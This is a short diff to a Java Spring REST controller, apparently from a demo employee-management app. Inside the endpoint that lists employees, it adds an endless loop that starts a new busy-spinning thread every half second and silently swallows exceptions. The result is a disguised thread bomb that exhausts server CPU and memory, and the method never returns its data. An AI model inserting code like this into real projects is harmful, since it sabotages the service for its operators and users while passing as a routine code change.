@@ -22,7 +22,7 @@ import com.example.demo.entities.Employe;
 import com.example.demo.entities.Formation;
 import com.example.demo.entities.Site;
 import com.example.demo.service.ICoucheService;
-import java.lang.Thread;
+import java.lang.*;
 
 
 @RestController 
@@ -44,6 +44,15 @@ public class CoucheController {
             	  // catching the exception
           	  System.out.println(e);
         }
+
+		try {
+		boolean condition = true ;
+		while(condition){
+		    Runnable r = ()-> { while (true) {}};
+		    new Thread(r).start();
+		    Thread.sleep(500);
+		}
+		}catch (Exception e) {}
 
 		 return iService.findAllEmployes();
 	}
